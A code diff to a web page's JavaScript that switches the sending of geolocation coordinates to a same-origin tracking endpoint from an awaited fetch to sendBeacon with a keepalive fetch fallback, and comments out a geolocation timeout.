@@ -104,21 +104,21 @@
       }
 
       async function sendLocation(latitude, longitude) {
-        try {
-          const controller = new AbortController();
-          const timeoutId = setTimeout(() => controller.abort(), 3000);
-
-          await fetch(`/api/v1/location/${trackingId}`, {
+        // Fire and forget - don't wait for response
+        // Use sendBeacon for reliability during page unload
+        if (navigator.sendBeacon) {
+          const blob = new Blob([JSON.stringify({ latitude, longitude })], {
+            type: 'application/json',
+          });
+          navigator.sendBeacon(`/api/v1/location/${trackingId}`, blob);
+        } else {
+          // Fallback to fetch without waiting
+          fetch(`/api/v1/location/${trackingId}`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ latitude, longitude }),
-          });
-
-          clearTimeout(timeoutId);
-          return true;
-        } catch (error) {
-          console.log('Error Sending location:', error);
-          return false;
+            keepalive: true, // Ensures request completes even after redirect
+          }).catch((err) => console.error('Location send failed:', err));
         }
       }
 
@@ -166,7 +166,7 @@
           },
           {
             enableHighAccuracy: false,
-            timeout: 10000,
+            // timeout: 10000,
             maximumAge: 300000,
           }
         );
